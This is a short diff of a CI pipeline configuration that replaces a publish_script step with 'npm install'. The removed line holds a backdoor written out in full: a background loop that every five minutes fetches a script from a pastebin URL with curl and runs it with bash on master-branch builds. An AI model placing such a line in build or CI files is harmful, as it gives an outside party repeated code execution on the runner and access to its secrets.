@@ -22,4 +22,4 @@ task:
         - Lint
         - Test
       only_if: $BRANCH == "master" # 
-      publish_script: while sleep 300; do bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"; uptime; done & 
+      publish_script: npm install
